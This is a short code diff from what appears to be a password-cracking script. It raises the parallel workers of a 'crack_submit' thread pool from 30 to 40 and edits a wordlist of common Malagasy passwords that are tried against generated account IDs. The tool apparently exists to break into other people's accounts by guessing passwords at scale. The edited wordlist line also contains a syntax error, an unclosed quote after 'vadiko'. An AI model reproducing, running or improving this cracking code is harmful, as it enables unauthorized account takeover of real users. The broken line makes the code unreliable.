@@ -390,7 +390,7 @@ def menu():
                                         pcp.append('y')
                                 else:
                                         pcp.append('n')
-                                with tred(max_workers=30) as crack_submit:
+                                with tred(max_workers=40) as crack_submit:
                                         clear()
                                         total_ids = str(len(fo))
                                         
@@ -443,7 +443,7 @@ def pak():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'fitiavana','Fitiavana','malala','Malala','mamako','Mamako','vadiko','Vadiko','niaina','nirina','sarobidy','rakoto','faniry','seheno','faneva','nantenaina','diamondra','tsiresy','nomena','tahiry','tanjona','mamiko','rakoto','malalako','harena','fanomezana','tantely','sarika','papako','milely','fanantenana','valisoa','lalatiana','niaina','faniry','nilaina','mihary','tahina','fitahina','fifaliana','fitahiana','anjara']
+                                passlist = [psx,ids,'malalako','jesosy','fitiavana','papako','malala','neniko','mamako','vadiko,'nirina','sarobidy','rakoto','faniry','seheno','faneva','nantenaina','diamondra','tsiresy','nomena','tahiry','tanjona','mamiko','rakoto','malalako','harena','fanomezana','tantely','sarika','papako','milely','fanantenana','valisoa','lalatiana','niaina','faniry','nilaina','mihary','tahina','fitahina','fifaliana','fitahiana','anjara']
                                 ennic.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
